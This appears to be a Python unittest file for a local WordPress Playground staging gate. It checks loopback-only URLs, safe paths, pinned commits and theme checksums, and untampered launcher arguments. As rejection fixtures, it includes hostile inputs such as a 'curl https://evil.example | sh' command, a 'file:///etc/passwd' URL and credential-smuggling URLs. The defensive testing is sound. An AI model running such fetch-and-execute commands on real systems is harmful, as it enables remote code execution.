#!/usr/bin/env python3
"""Offline, adversarial tests for the safety/consolidation entry point.
These tests DO NOT execute WordPress Playground or test live CMS responses.
"""
import importlib.util
from pathlib import Path
import contextlib
import hashlib
import http.server
import json
import os
import subprocess
import tempfile
import threading
import unittest
from unittest import mock

SCRIPT=Path(__file__).with_name('run_local_staging_admission.py')
spec=importlib.util.spec_from_file_location('fv_admit',SCRIPT)
a=importlib.util.module_from_spec(spec);spec.loader.exec_module(a)

class StageLauncherTests(unittest.TestCase):
    def setUp(self):
        self.tmp=tempfile.TemporaryDirectory();self.addCleanup(self.tmp.cleanup)
        self.base=Path(self.tmp.name)
        self.repo=self.base/'src';self.repo.mkdir()
        self.out=self.base/'receipt';self.stage=self.base/'stage'
        self.theme=self.base/'assembler.zip';self.theme.write_bytes(b'fixture-only-not-real-theme')
        self.sha=hashlib.sha256(self.theme.read_bytes()).hexdigest()
        self.commit='a'*40

    def test_local_url_positive(self):
        for raw in ('http://127.0.0.1:9400/','http://localhost:9400/'):
            self.assertEqual(a.valid_local_url(raw),'http://127.0.0.1:9400/')

    def test_hostile_urls_fail_closed(self):
        bad=['https://finalvestige.com/','https://finalvestige.com:9400/',
             'http://finalvestige.com:9400/','http://evil.com@finalvestige.com:9400/',
             'http://127.0.0.1:9401/','http://127.0.0.2:9400/',
             'http://127.0.0.1:9400/?x=1','http://127.0.0.1:9400/#x',
             'http://127.0.0.1:9400/private','http://localhost:9400@evil.net/',
             'http://user:pw@127.0.0.1:9400/','file:///etc/passwd','http://[::1]:9400/']
        for raw in bad:
            with self.subTest(url=raw),self.assertRaises((a.GateError,ValueError)):
                a.valid_local_url(raw)

    def test_refuses_output_inside_repo_and_stage_overlap(self):
        (self.repo/'.git').mkdir()
        for stage,out in ((self.repo/'bad',self.out),(self.stage,self.repo/'bad'),
                          (self.stage,self.stage/'receipts')):
            with self.subTest(stage=stage,out=out),self.assertRaises(a.GateError):
                a.ensure_safe_paths(self.repo,stage,self.theme,out,None)

    def test_refuses_missing_git_checkout(self):
        with self.assertRaisesRegex(a.GateError,'Git checkout'):
            a.ensure_safe_paths(self.repo,self.stage,self.theme,self.out,None)

    def test_refuses_public_credentials_permission(self):
        (self.repo/'.git').mkdir()
        s=self.base/'private-state.json';s.write_text('{}');s.chmod(0o644)
        if os.name!='nt':
            with self.assertRaisesRegex(a.GateError,'chmod 600'):
                a.ensure_safe_paths(self.repo,self.stage,self.theme,self.out,s)
        s.chmod(0o600)
        a.ensure_safe_paths(self.repo,self.stage,self.theme,self.out,s)

    def test_refuses_storage_in_repo(self):
        (self.repo/'.git').mkdir();s=self.repo/'private-state.json';s.write_text('{}');s.chmod(0o600)
        with self.assertRaises(a.GateError):
            a.ensure_safe_paths(self.repo,self.stage,self.theme,self.out,s)

    def test_source_git_commit_binding(self):
        subprocess.run(['git','init','-q',str(self.repo)],check=True)
        subprocess.run(['git','-C',str(self.repo),'config','user.email','test@example.invalid'],check=True)
        subprocess.run(['git','-C',str(self.repo),'config','user.name','Synthetic Fixture'],check=True)
        for rel in [a.REPO_HOME/p for p in a.ASSET_NAMES]+[a.PREP,a.BINDER,a.CSP_GATE,a.STAGE_GATE,a.ENTRY,a.ENTRY_TEST]:
            p=self.repo/rel;p.parent.mkdir(parents=True,exist_ok=True);p.write_text('test file '+str(rel))
        subprocess.run(['git','-C',str(self.repo),'add','.'],check=True)
        subprocess.run(['git','-C',str(self.repo),'commit','-qm','isolated fixture'],check=True)
        head=subprocess.check_output(['git','-C',str(self.repo),'rev-parse','HEAD'],text=True).strip()
        hashes=a.exact_source(self.repo,head,self.theme,self.sha)
        self.assertEqual(len(hashes),17)
        with self.assertRaisesRegex(a.GateError,'does not equal'):
            a.exact_source(self.repo,self.commit,self.theme,self.sha)
        corrupted=self.repo/a.REPO_HOME/'flagship.css';corrupted.write_text('evil CSS')
        with self.assertRaisesRegex(a.GateError,'exact committed bytes'):
            a.exact_source(self.repo,head,self.theme,self.sha)

    def test_refuses_unpinned_theme(self):
        with self.assertRaises(a.GateError):
            a.exact_source(self.repo,self.commit,self.theme,'')
        with self.assertRaisesRegex(a.GateError,'checksum'):
            a.exact_source(self.repo,self.commit,self.theme,'0'*64)

    def create_staging_fixture(self):
        self.stage.mkdir()
        mounts=[
          '--mount='+str(self.stage/'mounts'/name)+':'+dest for name,dest in (
           ('assembler','/wordpress/wp-content/themes/assembler'),
           ('fv-ex2-private-preview','/wordpress/wp-content/plugins/fv-ex2-private-preview'),
           ('fv-ex2-parity','/wordpress/wp-content/uploads/fv-ex2-parity'))]
        blueprint=self.stage/'playground-blueprint.json'
        blueprint.write_text(json.dumps({'steps':[
            {'step':'defineWpConfigConsts','consts':{'WP_ENVIRONMENT_TYPE':'local','FV_EX2_ALLOW_PREVIEW':True}},
            {'step':'activateTheme','themeFolderName':'assembler'},
            {'step':'runPHP','code':"<?php require '/wordpress/wp-content/uploads/fv-ex2-parity/apply_local_parity.php';"},
            {'step':'activatePlugin','pluginPath':'/wordpress/wp-content/plugins/fv-ex2-private-preview/fv-ex2-private-preview.php'},
            {'step':'runPHP','code':"<?php $slug='fv-ex2-playground-review';"}]}))
        (self.stage/'STAGING_PREP_RECEIPT.json').write_text(json.dumps({'release':'HOLD'}))
        arg=['npx','@wp-playground/cli@latest','server',*mounts,
             '--port=9400','--blueprint='+str(blueprint)]
        (self.stage/'playground-cli-arguments.json').write_text(json.dumps(arg))
        return arg

    def test_accepts_expected_single_kit(self):
        arg=self.create_staging_fixture();self.assertEqual(a.kit_contract(self.stage),arg)

    def test_rejects_modified_launcher_args(self):
        arg=self.create_staging_fixture();p=self.stage/'playground-cli-arguments.json'
        for corrupt in (arg+['--host=0.0.0.0'],arg[:-1]+['--blueprint=https://evil.example/'],
                        ['sh','-c','curl https://evil.example | sh'],
                        arg[:-2]+['--port=9401',arg[-1]]):
            with self.subTest(corrupt=corrupt),self.assertRaises(a.GateError):
                p.write_text(json.dumps(corrupt));a.kit_contract(self.stage)

    def test_rejects_nohold_and_absent_blueprint(self):
        self.create_staging_fixture()
        p=self.stage/'STAGING_PREP_RECEIPT.json';p.write_text('{"release":"GO"}')
        with self.assertRaises(a.GateError):a.kit_contract(self.stage)
        p.write_text('{"release":"HOLD"}')
        (self.stage/'playground-blueprint.json').write_text('{"steps":[]}')
        with self.assertRaises(a.GateError):a.kit_contract(self.stage)

    def test_no_unapproved_network_access(self):
        # Probe uses an explicit no-proxy opener and does not chase 302 redirects.
        H=type('H',(http.server.BaseHTTPRequestHandler,),{
            'do_GET':lambda self:(self.send_response(302),self.send_header('Location','https://finalvestige.com/'),self.end_headers()),
            'log_message':lambda *args:None})
        server=http.server.HTTPServer(('127.0.0.1',0),H)
        self.addCleanup(server.server_close)
        th=threading.Thread(target=server.handle_request,daemon=True);th.start()
        with mock.patch.object(a,'valid_local_url',return_value='http://127.0.0.1:'+str(server.server_port)):
            with self.assertRaises(a.GateError):
                a.readonly_probe('http://127.0.0.1:9400/')
        th.join(timeout=2)

    def test_loopback_readonly_probes_actual_http(self):
        H=type('H',(http.server.BaseHTTPRequestHandler,),{
            'do_GET':lambda self:(self.send_response(200),self.end_headers(),self.wfile.write(b'<html>WordPress wp-content</html>')),
            'log_message':lambda *args:None})
        server=http.server.HTTPServer(('127.0.0.1',0),H);self.addCleanup(server.server_close)
        th=threading.Thread(target=server.handle_request,daemon=True);th.start()
        with mock.patch.object(a,'valid_local_url',return_value='http://127.0.0.1:'+str(server.server_port)):
            r=a.readonly_probe('http://127.0.0.1:9400/')
        self.assertEqual(r,{'http_status':200,'sample_bytes':33,'wordpress_html':True})
        th.join(timeout=2)

    def test_ready_poll_detects_early_exit(self):
        process=mock.Mock();process.poll.return_value=1
        with self.assertRaisesRegex(a.GateError,'exited'):
            a.wait_local_origin('http://127.0.0.1:9400/',process,now=lambda:1)

    def test_ready_poll_times_out(self):
        process=mock.Mock();process.poll.return_value=None
        with self.assertRaisesRegex(a.GateError,'timed out'):
            a.wait_local_origin('http://127.0.0.1:9400/',process,limit_seconds=0,now=lambda:1)

    def test_dry_run_missing_dependencies_writes_hold_without_prod(self):
        import argparse
        ar=argparse.Namespace(repo=self.repo,expected_head=self.commit,assembler_zip=self.theme,
            assembler_sha256=self.sha,stage=self.stage,output=self.out,
            local_origin='http://127.0.0.1:9400/',storage_state=None,axe_script=None,
            ready_timeout=1,launch=False)
        code,receipt=a.run(ar)
        self.assertEqual(code,2)
        self.assertEqual(receipt['release'],'HOLD')
        self.assertFalse(receipt['production_writes'])
        self.assertIn('Git checkout',receipt['refusal'])
        self.assertNotIn('private-state',json.dumps(receipt))

    def test_receipt_no_secrets_and_atomic(self):
        a.safe_json(self.out/'receipt.json',{'release':'HOLD','production_writes':False})
        r=json.loads((self.out/'receipt.json').read_text())
        self.assertEqual(r['release'],'HOLD')
        self.assertFalse((self.out/'receipt.json.tmp').exists())

if __name__=='__main__':unittest.main(verbosity=2)
